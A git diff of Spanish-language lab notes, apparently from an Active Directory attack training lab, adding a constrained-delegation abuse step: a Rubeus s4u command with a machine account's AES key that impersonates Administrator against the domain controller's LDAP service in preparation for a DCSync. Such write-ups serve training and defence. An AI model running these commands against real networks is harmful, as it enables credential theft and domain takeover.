@@ -1276,11 +1276,16 @@ A continuación vamos a acceder al sistema de archivos del usuario
 dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
 
-Ahora a continuación enumeraremos los equipos que tengan habilitada la delegacion restringida
+Ahora a continuación enumeraremos los equipos que tengan habilitada la delegación restringida
 ```shell
 Get-DomainComputer -TrustedToAuth
 ```
 
-AHora hemos encontrado el equipo *adminsrv* del cual vanmos a busar de tenr la delegacion restringida habilitada
+Ahora hemos encontrado el equipo *adminsrv* del cual vamos a abusar de tener la delegación restringida habilitada
+
+Tenemos de anteriores ocasiones la clave AES de la maquina *adminsrv* asi que ahora vamos a usarlo para hacer un *DCSync*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
+```
 
 
